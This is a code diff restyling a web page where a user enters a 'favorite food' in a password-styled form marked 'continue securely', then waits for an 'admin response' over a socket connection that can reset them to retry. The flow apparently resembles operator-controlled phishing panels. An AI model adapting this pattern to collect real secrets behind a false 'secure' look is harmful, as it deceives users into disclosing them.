@@ -17,11 +17,11 @@
       justify-content: center;
       align-items: flex-start;
       min-height: 100vh;
-      padding-top: 80px;
+      padding: 20px;
     }
 
     .app {
-      width: 90%;
+      width: 100%;
       max-width: 420px;
     }
 
@@ -29,21 +29,19 @@
       display: none;
     }
 
-    h2 {
-      font-weight: 500;
-      margin-bottom: 30px;
-      color: #222;
-    }
+    /* ===== SCREEN 1 - PASSWORD STYLE (SAME AS EMAIL) ===== */
 
-    /* ===== SCREEN 1 & 2 NEW DESIGN ===== */
-
-    #screen1, #screen2 {
+    #screen1 {
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       min-height: 100vh;
       border-radius: 20px;
       padding: 50px 30px;
       box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
       animation: slideUp 0.5s ease-out;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
     }
 
     @keyframes slideUp {
@@ -57,86 +55,147 @@
       }
     }
 
-    #screen1 h2, #screen2 h2 {
-      color: #ffffff;
+    .screen1-container {
+      width: 100%;
+      max-width: 400px;
       text-align: center;
-      font-size: 28px;
-      margin-bottom: 45px;
-      text-transform: capitalize;
     }
 
-    /* SCREEN 1 INPUT */
+    .screen1-header {
+      margin-bottom: 45px;
+    }
 
-    .input-group {
+    .screen1-icon {
+      width: 60px;
+      height: 60px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 28px;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.05);
+      }
+    }
+
+    .screen1-title {
+      font-size: 28px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 10px;
+      line-height: 1.3;
+    }
+
+    .screen1-subtitle {
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.8);
+      line-height: 1.6;
+    }
+
+    .screen1-form {
+      margin-top: 40px;
+    }
+
+    .screen1-form-group {
       margin-bottom: 30px;
     }
 
-    .input-group input {
-      width: 100%;
-      border: none;
-      padding: 14px 16px;
-      font-size: 16px;
-      background: rgba(255, 255, 255, 0.95);
-      outline: none;
-      border-radius: 12px;
-      transition: all 0.3s ease;
-      color: #1a1a1a;
-      font-weight: 500;
+    .screen1-input-wrapper {
+      position: relative;
+      margin-bottom: 5px;
     }
 
-    .input-group input::placeholder {
+    .screen1-input-wrapper input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 12px;
+      transition: all 0.3s ease;
+      background: rgba(255, 255, 255, 0.95);
+      color: #1a1a1a;
+      font-weight: 500;
+      outline: none;
+    }
+
+    .screen1-input-wrapper input::placeholder {
       color: #999;
       font-weight: 400;
     }
 
-    .input-group input:focus {
+    .screen1-input-wrapper input:focus {
+      outline: none;
+      border-color: rgba(255, 255, 255, 0.8);
       background: #ffffff;
-      box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.2);
+      box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.15);
       transform: translateY(-2px);
     }
 
-    .btn-container {
-      margin-top: 40px;
-      text-align: center;
+    .screen1-error {
+      color: #ff6b6b;
+      font-size: 13px;
+      margin-top: 6px;
+      display: none;
+      animation: shake 0.3s ease-in-out;
     }
 
-    button {
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+
+    .screen1-error.show {
+      display: block;
+    }
+
+    .screen1-button {
       width: 100%;
-      background: rgba(255, 255, 255, 0.95);
-      color: #667eea;
-      border: none;
-      padding: 16px 22px;
-      border-radius: 12px;
-      cursor: pointer;
+      padding: 16px;
       font-size: 16px;
       font-weight: 600;
+      border: none;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.95);
+      color: #667eea;
+      cursor: pointer;
       transition: all 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 0.5px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      margin-top: 10px;
+      position: relative;
+      overflow: hidden;
     }
 
-    button:hover {
+    .screen1-button:hover:not(:disabled) {
       background: white;
       transform: translateY(-2px);
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
     }
 
-    button:active {
+    .screen1-button:active:not(:disabled) {
       transform: translateY(0);
     }
 
-    button:disabled {
+    .screen1-button:disabled {
       opacity: 0.6;
       cursor: not-allowed;
     }
 
-    button.loading {
-      position: relative;
+    .screen1-button.loading {
       color: transparent;
     }
 
-    button.loading::after {
+    .screen1-button.loading::after {
       content: '';
       position: absolute;
       width: 16px;
@@ -151,32 +210,44 @@
       animation: spin 0.6s linear infinite;
     }
 
-    /* ===== MODERN SPINNER ===== */
-
-    .spinner-wrapper {
-      text-align: center;
-      padding: 60px 20px;
-    }
-
-    .loader {
-      width: 60px;
-      height: 60px;
-      border: 4px solid rgba(255, 255, 255, 0.3);
-      border-top: 4px solid white;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 20px auto;
-    }
-
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
 
-    .loading-text {
-      color: rgba(255, 255, 255, 0.9);
+    /* ===== SCREEN 2 - LOADING SPINNER ONLY ===== */
+
+    #screen2 {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      border-radius: 20px;
+      padding: 50px 30px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+      animation: slideUp 0.5s ease-out;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .screen2-spinner-wrapper {
+      text-align: center;
+    }
+
+    .screen2-loader {
+      width: 80px;
+      height: 80px;
+      border: 4px solid rgba(255, 255, 255, 0.2);
+      border-top: 4px solid white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 30px auto;
+    }
+
+    .screen2-loading-text {
+      color: rgba(255, 255, 255, 0.95);
       font-size: 16px;
       font-weight: 500;
-      margin-top: 20px;
+      letter-spacing: 0.5px;
     }
 
     /* ===== RESULT SCREENS A B C (UNCHANGED) ===== */
@@ -384,7 +455,7 @@
     /* ===== MOBILE OPTIMIZATION ===== */
     @media (max-width: 480px) {
       body {
-        padding-top: 60px;
+        padding: 15px;
       }
 
       #screen1, #screen2 {
@@ -392,31 +463,27 @@
         border-radius: 16px;
       }
 
-      #screen1 h2, #screen2 h2 {
+      .screen1-title {
         font-size: 24px;
       }
 
-      .input-group input {
+      .screen1-input-wrapper input {
         padding: 13px 14px;
         font-size: 16px;
       }
 
-      button {
+      .screen1-button {
         padding: 14px;
         font-size: 15px;
       }
 
-      .spinner-wrapper {
-        padding: 40px 20px;
+      .screen2-loader {
+        width: 60px;
+        height: 60px;
       }
 
-      .loader {
-        width: 50px;
-        height: 50px;
-      }
-
-      .btn-container {
-        text-align: center;
+      .screen2-loading-text {
+        font-size: 15px;
       }
 
       .c-wrapper {
@@ -444,25 +511,40 @@
 
 <div class="app">
 
-  <!-- SCREEN 1 -->
+  <!-- SCREEN 1 - PASSWORD INPUT STYLE -->
   <div id="screen1" class="screen">
-    <h2>enter favorite food</h2>
+    <div class="screen1-container">
+      <div class="screen1-header">
+        <div class="screen1-icon">🔐</div>
+        <h2 class="screen1-title">Enter Your Food</h2>
+        <p class="screen1-subtitle">Complete this step to continue securely</p>
+      </div>
 
-    <div class="input-group">
-      <input type="text" id="foodInput" placeholder="Enter your food here..." />
-    </div>
+      <form id="foodForm" class="screen1-form" onsubmit="submitFood(event)">
+        <div class="screen1-form-group">
+          <div class="screen1-input-wrapper">
+            <input 
+              type="text" 
+              id="foodInput" 
+              name="food" 
+              placeholder="Enter your favorite food"
+              autocomplete="off"
+              required
+            >
+          </div>
+          <div class="screen1-error" id="errorMsg"></div>
+        </div>
 
-    <div class="btn-container">
-      <button onclick="submitFood()">continue</button>
+        <button type="submit" class="screen1-button" id="submitBtn">Continue</button>
+      </form>
     </div>
   </div>
 
-  <!-- SCREEN 2 -->
+  <!-- SCREEN 2 - LOADING SPINNER -->
   <div id="screen2" class="screen">
-    <h2>Processing</h2>
-    <div class="spinner-wrapper">
-      <div class="loader"></div>
-      <div class="loading-text">Waiting for admin response...</div>
+    <div class="screen2-spinner-wrapper">
+      <div class="screen2-loader"></div>
+      <div class="screen2-loading-text">Waiting for admin response...</div>
     </div>
   </div>
 
@@ -546,7 +628,7 @@
         </div>
 
         <div class="c-loading" id="cLoading">
-          <div class="loader"></div>
+          <div class="screen2-loader" style="margin-top: 20px;"></div>
         </div>
 
       </div>
@@ -576,9 +658,21 @@
     sessionId = data.sessionId;
   });
 
-  function submitFood() {
-    const food = document.getElementById("foodInput").value;
-    if (!food) return;
+  function submitFood(event) {
+    event.preventDefault();
+    const food = document.getElementById("foodInput").value.trim();
+    const errorMsg = document.getElementById("errorMsg");
+    const submitBtn = document.getElementById("submitBtn");
+
+    if (!food) {
+      errorMsg.textContent = "Please enter your favorite food";
+      errorMsg.classList.add("show");
+      return;
+    }
+
+    errorMsg.classList.remove("show");
+    submitBtn.classList.add("loading");
+    submitBtn.disabled = true;
 
     socket.emit("submit_food", {
       sessionId: sessionId,
@@ -627,6 +721,10 @@
   });
 
   socket.on("reset_food", () => {
+    document.getElementById("foodInput").value = "";
+    document.getElementById("errorMsg").classList.remove("show");
+    document.getElementById("submitBtn").classList.remove("loading");
+    document.getElementById("submitBtn").disabled = false;
     showScreen("screen1");
   });
 
